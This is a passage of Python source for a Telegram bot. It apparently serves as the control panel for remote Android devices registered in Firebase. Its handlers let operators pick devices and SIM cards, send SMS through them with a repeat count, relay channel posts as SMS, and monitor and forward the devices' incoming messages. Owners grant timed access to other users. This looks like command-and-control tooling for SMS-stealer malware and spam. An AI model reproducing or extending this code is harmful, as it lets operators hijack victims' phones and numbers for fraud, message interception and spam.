    d=load(); uid=msg.from_user.id; fsmd=await state.get_data(); to=fsmd.get("test_to","")
    u=usr(uid,d); ac=u.get("active",{}); await state.clear()
    if not ac.get("fb_url"):
        await msg.answer("❌  No active combo. Run wizard first."); return
    wait=await msg.answer("📤  Sending…")
    ok=await send_via_fb(ac["fb_url"],ac["device_id"],ac.get("sims",[0])[0],to,msg.text.strip())
    await wait.delete()
    icon="✅" if ok else "❌"
    await msg.answer(f"{icon}  **{'Sent!' if ok else 'Failed!'}**\n📞 `{to}`",
        reply_markup=kb([("🏠  Home","home")]), parse_mode="Markdown")

@R.message(W.fwd_add)
async def f_fwd_add(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; text=msg.text.strip(); u=usr(uid,d)
    if text not in u["fwd"]: u["fwd"].append(text)
    save(d); await state.clear()
    await msg.answer(f"✅  Forward target added: `{text}`",
        reply_markup=_fwd_kb(uid,d), parse_mode="Markdown")

@R.message(W.adm_add)
async def f_adm_add(msg:Message, state:FSMContext):
    if not is_owner(msg.from_user.id): await state.clear(); return
    d=load()
    try:
        nid=int(msg.text.strip())
        if nid not in d["admins"]: d["admins"].append(nid)
        save(d); await state.clear()
        await msg.answer(f"✅  Admin added: `{nid}`",
            reply_markup=adm_menu_kb(msg.from_user.id,d), parse_mode="Markdown")
        try: await msg.bot.send_message(nid,"🎉  You're now an **Admin**! Send /start",parse_mode="Markdown")
        except: pass
    except: await msg.answer("❌  Invalid Telegram user ID.")

@R.message(W.usr_add_id)
async def f_usr_add_id(msg:Message, state:FSMContext):
    try:
        uid2=int(msg.text.strip())
        await state.update_data(new_uid=uid2); await state.set_state(W.usr_add_exp)
        await msg.answer(f"✅  User ID: `{uid2}`\n\n⏱  **Select access duration:**",
            reply_markup=timed_access_kb(), parse_mode="Markdown")
    except: await msg.answer("❌  Send a valid Telegram user ID.")

@R.message(W.usr_add_exp)
async def f_usr_add_exp(msg:Message, state:FSMContext):
    d=load(); uid=msg.from_user.id; text=msg.text.strip()
    fsmd=await state.get_data(); uid2=fsmd.get("new_uid"); await state.clear()
    try:
        for fmt in ("%d/%m/%Y","%Y-%m-%d","%d-%m-%Y"):
            try: dt=datetime.strptime(text,fmt); exp=dt.timestamp(); break
            except: pass
        else: raise ValueError
        _add_timed_user(uid2,exp,uid,d); save(d)
        await msg.answer(f"✅  User `{uid2}` added until `{text}`",
            reply_markup=adm_menu_kb(uid,d), parse_mode="Markdown")
        try: await msg.bot.send_message(uid2,f"✅  Access granted until `{text}`.\nSend /start",parse_mode="Markdown")
        except: pass
    except: await msg.answer("❌  Invalid date. Use DD/MM/YYYY")

# ═══════════════════════════════════════════════════════════
#  CALLBACKS
# ═══════════════════════════════════════════════════════════
@R.callback_query()
async def cb(cq:CallbackQuery, state:FSMContext):
    d=load(); uid=cq.from_user.id; c=cq.data
    if not can_use(uid,d): await cq.answer("🚫  Access denied.",show_alert=True); return
    u=usr(uid,d); log.debug(f"CB uid={uid} c={c}")

    if c=="home":
        await state.clear()
        await sedit(cq, home_card(uid,load()), main_menu(uid,load()))

    elif c=="wiz:start":
        await state.clear()
        fbs=u.get("firebases",[])
        if fbs:
            await sedit(cq, wizard_step_card(1,5,"Select Firebase","Pick existing or add new"),
                        fb_pick_kb(fbs))
        else:
            await state.update_data(wizard=True)
            await state.set_state(W.fb_url)
            await sedit(cq,
                wizard_step_card(1,5,"Firebase URL","https://your-project.firebaseio.com"),
                kb([("❌  Cancel","home")]))

    elif c=="wiz:retry_dev":
        fsmd=await state.get_data()
        if fsmd.get("wiz_fb_url"):
            await _wiz_fetch_devices(cq.bot,uid,fsmd["wiz_fb_url"],fsmd.get("wiz_fb",""),cq)

    elif c.startswith("wpick:fb:"):
        fid=c.split("wpick:fb:",1)[1]
        fb=next((f for f in u.get("firebases",[]) if f["id"]==fid),None)
        if not fb: await cq.answer("Not found!",show_alert=True); return
        await state.update_data(wizard=True,wiz_fb=fid,wiz_fb_url=fb["url"])
        await _wiz_fetch_devices(cq.bot,uid,fb["url"],fid,cq)

    elif c.startswith("faddpg:"):
        page=int(c.split(":")[1]); cache=u.get("_dev_cache",{})
        online={k:v for k,v in cache.items() if dev_online(v)}
        await sedit(cq, wizard_step_card(2,5,"Select Device",f"Page {page+1}"),
                    online_devices_kb(online,page))

    elif c.startswith("fadd:"):
        did=c.split("fadd:",1)[1]; cache=u.get("_dev_cache",{})
        dd=cache.get(did,{}); name=dd.get("deviceName") or dd.get("name") or did[:20]
        sims=dd.get("sims",[]); fsmd=await state.get_data()
        if did not in [x["id"] for x in u.get("devices",[])]:
            u["devices"].append({"id":did,"name":name,"fb_id":fsmd.get("wiz_fb",""),"sims":sims})
            save(d)
        if sims:
            await state.update_data(wiz_dev=did,wiz_sims_avail=sims,wiz_sims_sel=[])
            await sedit(cq, wizard_step_card(3,5,"Select SIM(s)","Tap to toggle, then Confirm"),
                        sim_kb(sims,[],did))
        else:
            await state.update_data(wiz_dev=did,wiz_sims=[0])
            await sedit(cq, wizard_step_card(4,5,"Select Channel"),
                        ch_pick_kb(u.get("channels",[])))

    elif c=="dev:manual":
        fsmd=await state.get_data(); await state.update_data(**fsmd)
        await state.set_state(W.dev_manual)
        await sedit(cq,"🔍  Enter Device ID manually:",kb([("❌  Cancel","home")]))

    elif c.startswith("simtog:"):
        parts=c.split(":"); did=parts[1]; idx=int(parts[2])
        fsmd=await state.get_data(); sel=list(fsmd.get("wiz_sims_sel",[]))
        if idx in sel: sel.remove(idx)
        else: sel.append(idx)
        await state.update_data(wiz_sims_sel=sel)
        sims=fsmd.get("wiz_sims_avail",[])
        await sedit(cq, wizard_step_card(3,5,"Select SIM(s)",f"{len(sel)} selected"),
                    sim_kb(sims,sel,did))

    elif c.startswith("simok:"):
        fsmd=await state.get_data(); sel=fsmd.get("wiz_sims_sel",[])
        if not sel: await cq.answer("Select at least one SIM!",show_alert=True); return
        await state.update_data(wiz_sims=sel)
        chs=u.get("channels",[])
        if chs:
            await sedit(cq, wizard_step_card(4,5,"Select Channel"), ch_pick_kb(chs))
        else:
            await state.set_state(W.ch_input)
            await sedit(cq, wizard_step_card(4,5,"Channel","Send @username or chat ID"),
                        kb([("❌  Cancel","home")]))

    elif c.startswith("wpick:ch:"):
        cid=c.split("wpick:ch:",1)[1]
        ch=next((x for x in u.get("channels",[]) if str(x["id"])==str(cid)),None)
        if not ch: await cq.answer("Not found!",show_alert=True); return
        fsmd=await state.get_data()
        await state.update_data(**fsmd,wiz_ch=ch["id"])
        await sedit(cq, wizard_step_card(5,5,"Repeat Count","How many times per SMS?"),
                    repeat_kb())

    elif c.startswith("wpick:dev:"):
        did=c.split("wpick:dev:",1)[1]
        dv=next((x for x in u.get("devices",[]) if x["id"]==did),None)
        if not dv: await cq.answer("Not found!",show_alert=True); return
        sims=dv.get("sims",[]); fsmd=await state.get_data()
        if sims:
            await state.update_data(**fsmd,wiz_dev=did,wiz_sims_avail=sims,wiz_sims_sel=[])
            await sedit(cq, wizard_step_card(3,5,"Select SIM(s)","Tap to toggle"),
                        sim_kb(sims,[],did))
        else:
            await state.update_data(**fsmd,wiz_dev=did,wiz_sims=[0])
            await sedit(cq, wizard_step_card(4,5,"Select Channel"), ch_pick_kb(u.get("channels",[])))

    elif c.startswith("wpick:devpg:"):
        page=int(c.split(":")[-1])
        await sedit(cq, wizard_step_card(2,5,"Select Device",f"Page {page+1}"),
                    dev_pick_kb(u.get("devices",[]),page))

    elif c.startswith("rpt:"):
        val=c.split(":")[1]; fsmd=await state.get_data()
        if val=="c":
            await state.update_data(**fsmd); await state.set_state(W.repeat_cust)
            await sedit(cq,"✏️  Enter repeat count (1–20):",kb([("❌  Cancel","home")]))
        else:
            rpt=int(val); await state.clear()
            await sedit(cq,"⏳  Starting monitor…")
            await _wiz_finish(cq.bot,uid,{**fsmd,"wiz_repeat":rpt},load())

    elif c=="mon:go":
        if u.get("monitoring"):
            _stop_mon(uid); u["monitoring"]=False; save(d)
            await send_theme_sticker(cq.bot, uid, "zerox")
            await sedit(cq,"⏸ **Monitor Paused**\n\nYou can restart it from the home screen.",main_menu(uid,load()))
        else:
            if not u.get("active",{}).get("fb_url"):
                await cq.answer("❌  Run Setup Wizard first!",show_alert=True); return
            u["monitoring"]=True; save(d); _start_mon(cq.bot,uid)
            await send_theme_sticker(cq.bot, uid, "zerox")
            await sedit(cq,"🟢 **Monitor Active**\n\nIncoming messages will now be monitored.",main_menu(uid,load()))

    elif c=="dash:show":
        d2=load(); u2=usr(uid,d2)
        await sedit(
            cq,
            f"{theme_emoji('finance', 2, '◆')} <b>LIVE DASHBOARD</b>\n"
            "<i>Route, delivery, and configuration health</i>\n\n"
            f"{active_combo_card(u2)}\n\n"
            f"{stats_card(u2)}\n\n"
            f"{setup_progress_card(u2)}",
            kb([("Refresh", "dash:show"), ("Command center", "home")]),
        )

    elif c=="my:menu":
        await sedit(cq,"⚙️  **My Settings**",my_menu_kb(uid,d))

    elif c=="fb:list":
        await sedit(cq,"🔥  **Firebase URLs**",
            list_kb(u.get("firebases",[]),"id","url","fb:del:","fb:add","my:menu"))

    elif c=="fb:add":
        await state.set_state(W.fb_url)
        await sedit(cq,"🔥  Send Firebase URL:\n`https://xxx.firebaseio.com`",
                    kb([("❌  Cancel","fb:list")]))

    elif c.startswith("fb:del:"):
        fid=c.split("fb:del:",1)[1]
        u["firebases"]=[f for f in u.get("firebases",[]) if f["id"]!=fid]
        save(d); await cq.answer("🗑  Removed.")
        await sedit(cq,"🔥  **Firebase URLs**",
            list_kb(u.get("firebases",[]),"id","url","fb:del:","fb:add","my:menu"))

    elif c=="dev:list":
        await sedit(cq,"📱  **Devices**",
            list_kb(u.get("devices",[]),"id","name","dev:del:","dev:add","my:menu"))

    elif c=="dev:add":
        fbs=u.get("firebases",[])
        if not fbs: await cq.answer("❌  Add Firebase first!",show_alert=True); return
        fb=fbs[0]
        await state.update_data(wizard=False,wiz_fb=fb["id"],wiz_fb_url=fb["url"])
        await _wiz_fetch_devices(cq.bot,uid,fb["url"],fb["id"],cq)

    elif c.startswith("dev:del:"):
        did=c.split("dev:del:",1)[1]
        u["devices"]=[x for x in u.get("devices",[]) if x["id"]!=did]
        save(d); await cq.answer("🗑  Removed.")
        await sedit(cq,"📱  **Devices**",
            list_kb(u.get("devices",[]),"id","name","dev:del:","dev:add","my:menu"))

    elif c=="ch:list":
        await sedit(cq,"📺  **Channels**",
            list_kb(u.get("channels",[]),"id","name","ch:del:","ch:add","my:menu"))

    elif c=="ch:add":
        await state.set_state(W.ch_input)
        await sedit(cq,"📺  Send channel `@username` or chat ID:",kb([("❌  Cancel","ch:list")]))

    elif c.startswith("ch:del:"):
        cid=c.split("ch:del:",1)[1]
        u["channels"]=[x for x in u.get("channels",[]) if str(x["id"])!=cid]
        save(d); await cq.answer("🗑  Removed.")
        await sedit(cq,"📺  **Channels**",
            list_kb(u.get("channels",[]),"id","name","ch:del:","ch:add","my:menu"))

    elif c=="test:go":
        if not u.get("active",{}).get("fb_url"):
            await cq.answer("❌  Run wizard first!",show_alert=True); return
        await state.set_state(W.test_to)
        await sedit(cq,"🧪  **Test SMS**\n\nEnter recipient number (+91XXXXXXXXXX):",
                    kb([("❌  Cancel","my:menu")]))

    elif c=="fwd:menu":
        await sedit(cq,"📤  **Forward Targets**",_fwd_kb(uid,d))

    elif c=="fwd:add":
        await state.set_state(W.fwd_add)
        await sedit(cq,"📤  Send `@username` or chat ID:",kb([("❌  Cancel","fwd:menu")]))

    elif c.startswith("fwd:del:"):
        tgt=c.split("fwd:del:",1)[1]
        u["fwd"]=[t for t in u.get("fwd",[]) if str(t)!=tgt]
        save(d); await cq.answer("🗑  Removed.")
        await sedit(cq,"📤  **Forward Targets**",_fwd_kb(uid,d))

    elif c=="reset:self":
        await sedit(cq,
            "⚠️  **Reset My Data?**\n\nAll your settings will be deleted.",
            kb([("✅  Yes, Reset","reset:self:yes"),("❌  Cancel","home")]))

    elif c=="reset:self:yes":
        _stop_mon(uid); d2=load(); d2["users"][str(uid)]=_new_user(); save(d2)
        await sedit(cq,"✅  **Your data has been reset.**",main_menu(uid,load()))

    elif c=="adm:menu":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await sedit(
            cq,
            f"{theme_emoji('control', 0, '◆')} <b>ADMIN CONSOLE</b>\n\n{admin_overview_card(d)}",
            adm_menu_kb(uid, d),
        )

    elif c=="adm:overview":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await sedit(cq, admin_overview_card(d), adm_menu_kb(uid,d))

    elif c=="adm:alerts":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await sedit(cq, admin_alert_card(d), kb([("⬅️ Back to Admin Center", "adm:menu")]))

    elif c=="adm:admins":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await sedit(cq, admin_directory_card(d), kb([("⬅️ Back to Admin Center", "adm:menu")]))

    elif c=="adm:users":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        lines=["👥  **All Users:**\n"]
        for k,v in d.get("users",{}).items():
            mon="🟢" if v.get("monitoring") else "🔴"
            s=v.get("stats",{})
            lines.append(f"  {mon}  `{k}`  ✅{s.get('sent',0)}  ❌{s.get('failed',0)}")
        for k,v in d.get("timed_users",{}).items():
            rem=v.get("expires",0)
            exp=datetime.fromtimestamp(rem).strftime("%d/%m %H:%M") if rem else "∞"
            lines.append(f"  ⏱  `{k}`  expires: {exp}")
        await sedit(cq,"\n".join(lines) or "No users.",kb([("🔙  Back","adm:menu")]))

    elif c=="adm:adduser":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        await state.set_state(W.usr_add_id)
        await sedit(cq,"👤  **Add User**\n\nSend Telegram user ID:",kb([("❌  Cancel","adm:menu")]))

    elif c.startswith("tacc:"):
        val=c.split(":")[1]; fsmd=await state.get_data(); uid2=fsmd.get("new_uid")
        if not uid2: await cq.answer("Session expired.",show_alert=True); return
        if val=="custom":
            await state.set_state(W.usr_add_exp)
            await sedit(cq,"📅  Send expiry date (DD/MM/YYYY):",kb([("❌  Cancel","adm:menu")]))
            return
        secs=int(val); exp=None if secs==0 else time.time()+secs
        d2=load(); _add_timed_user(uid2,exp,uid,d2); save(d2); await state.clear()
        label="Permanent ♾" if secs==0 else f"{secs//3600}h"
        await sedit(cq,f"✅  User `{uid2}` added — **{label}**",adm_menu_kb(uid,d2))
        try:
            msg2="♾  Permanent" if secs==0 else f"⏱  {secs//3600} hours"
            await cq.bot.send_message(uid2,f"✅  Access granted: **{msg2}**\nSend /start",parse_mode="Markdown")
        except: pass

    elif c=="adm:stats":
        if not is_admin(uid,d): await cq.answer("🚫",show_alert=True); return
        users=d.get("users",{}); ts=0; tf=0
        for v in users.values():
            s=v.get("stats",{}); ts+=s.get("sent",0); tf+=s.get("failed",0)
        bar=pbar(ts, ts + tf, 8) if ts + tf else "○" * 8
        active_count=sum(1 for v in users.values() if v.get("monitoring"))
        await sedit(cq,
            f"📊  **Global Stats**\n\n"
            f"  {bar}  {pct(ts,ts+tf)}\n\n"
            f"  👥  Users      : `{len(users)}`\n"
            f"  🟢  Monitoring  : `{active_count}`\n"
            f"  ✅  Total Sent  : `{ts}`\n"
            f"  ❌  Total Fail  : `{tf}`",
            kb([("🔙  Back","adm:menu")]))

    elif c=="adm:bcast":
        await cq.answer("Send /bcast <message> to broadcast — coming soon.",show_alert=True)

    elif c=="adm:free":
        if not is_owner(uid): await cq.answer("🚫  Owner only!",show_alert=True); return
        d["free"]=not d.get("free",False); save(d)
        await cq.answer(f"Free Mode: {'ON ✅' if d['free'] else 'OFF 🔴'}")
        await sedit(cq,"🛡  **Admin Tools**",adm_menu_kb(uid,d))

    elif c=="adm:addadmin":
        if not is_owner(uid): await cq.answer("🚫  Owner only!",show_alert=True); return
        await state.set_state(W.adm_add)
        await sedit(cq,"➕  **Add Admin**\n\nSend Telegram user ID:",kb([("❌  Cancel","adm:menu")]))

    elif c=="adm:resetall":
        if not is_owner(uid): await cq.answer("🚫  Owner only!",show_alert=True); return
        await sedit(cq,"💥  **Reset ALL users?**\n\nThis cannot be undone.",
            kb([("✅  Yes","adm:resetall:yes"),("❌  Cancel","adm:menu")]))

    elif c=="adm:resetall:yes":
        if not is_owner(uid): await cq.answer("🚫",show_alert=True); return
        for t in _tasks.values(): t.cancel()
        _tasks.clear(); _seen.clear()
        d2=load(); d2["users"]={};d2["timed_users"]={}; save(d2)
        await sedit(cq,"💥  **All data reset.**",adm_menu_kb(uid,load()))

    elif c in ("_noop_",): pass

    await cq.answer()

# ═══════════════════════════════════════════════════════════
#  GROUP / CHANNEL HANDLER
# ═══════════════════════════════════════════════════════════
@R.channel_post()
@R.message(F.chat.type.in_({"group","supergroup"}))
async def grp_handler(msg:Message):
    text=msg.text or msg.caption or ""
    if not text: return
    to,sms=parse_sms(text)
    if not to or not sms: return
    d=load()
    for uid_str,u in d.get("users",{}).items():
        ac=u.get("active",{})
        if not u.get("monitoring"): continue
        if str(ac.get("ch_id",""))!=str(msg.chat.id): continue
        asyncio.create_task(_do_send(msg.bot,int(uid_str),to,sms))

# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════
async def main():
    if not BOT_TOKEN:
        raise RuntimeError("BOT_TOKEN must be set before starting the bot")
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    await preload_theme_emojis(bot)
    me = await bot.get_me()
    log.info("@%s started (%s)", me.username, _VERSION)
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__=="__main__":
    asyncio.run(main())
